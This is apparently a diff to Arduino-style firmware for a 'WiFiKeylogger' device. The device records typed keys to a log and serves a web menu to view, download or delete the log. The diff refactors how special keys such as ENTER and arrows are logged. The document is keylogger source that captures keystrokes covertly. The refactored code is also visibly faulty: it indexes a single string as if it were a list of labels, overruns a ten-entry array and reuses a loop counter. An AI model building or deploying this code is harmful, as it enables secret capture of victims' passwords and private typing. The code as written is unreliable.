@@ -24,8 +24,6 @@
 #define SHIFT 0x02
 #define ALTGR 0x40
 
-int i = 0;
-int j = 0;
 int keys;
 int modifiers;
 String serial_data;
@@ -33,6 +31,9 @@ char serial_char[20];
 char *tmp_keys;
 char *tmp_modifiers;
 int key_modifier;
+
+int value_compare[] = {40, 41, 42, 43, 57, 79, 80, 81, 82, 83};
+char keys_compare[] = "\" [ENTER] \", \" [ESC] \", \" [BACKSPACE] \", \"[TAB] \", \" [CAPSLOCK] \", \" [KEY_RIGHT] \", \" [KEY_LEFT] \", \" [KEY_DOWN] \", \" [KEY_UP] \", \" [NUMLOCK] \"";
 
 const String MENU = "<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/downloadlog\">Download log</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>";
 
@@ -105,49 +106,23 @@ void loop() {
     modifiers = atoi(tmp_modifiers); // It's a modifier (example: shift = 0x02)
     key_modifier = keys + modifiers, HEX; // It's a key + modifier (example: A = 0x04|0x02)
 
-// TEST CODE WORKS. NOTE: I'M NOT A PROGRAMMER, I HAVE TO OPTIMIZE THE CODE xD
-    if(modifiers == 0){  // It's a key
-      if(keys == 40){
-        logs.print(" [KEY_RETURN] ");
-      }
-      else if(keys == 41){
-        logs.print(" [KEY_ESC]" );
-      }
-      else if(keys == 42){
-        logs.print(" [BACKSPACE] ");
-      }
-      else if(keys == 43){
-        logs.print(" [KEY_TAB] ");
-      }
-      else if(keys == 57){
-        logs.print(" [KEY_CAPSLOCK] ");
-      }
-      else if(keys == 79){
-        logs.print(" [KEY_RIGHT] ");
-      }
-      else if(keys == 80){
-        logs.print(" [KEY_LEFT] ");
-      }
-      else if(keys == 81){
-        logs.print(" [KEY_DOWN] ");
-      }
-      else if(keys == 82){
-        logs.print(" [KEY_UP]" );
-      }
-      else if(keys == 83){
-        logs.print(" [KEY_NUMLOCK] ");
-      } else {
-            
-      for (i = 0; i < 255; i++){
-        if(_keys_global[i] == keys) {
-          logs.write(i);
+    if(modifiers == 0){ // It's a key
+      for (int i = 0; i < 11; i++){
+        if(value_compare[i] == keys){
+          logs.println(keys_compare[i]);
+        } else {
+          
+          for (i = 0; i < 255; i++){
+            if(_keys_global[i] == keys) {
+            logs.write(i);
+           }
+          }
         }
       }
     }
-  }
     
     if(modifiers != 0){ // It's a key + modifier
-      for (j = 0; j < 255; j++){
+      for (int j = 0; j < 255; j++){
         if(_modifiers_global[j] == key_modifier) {
           logs.write(j);
         }
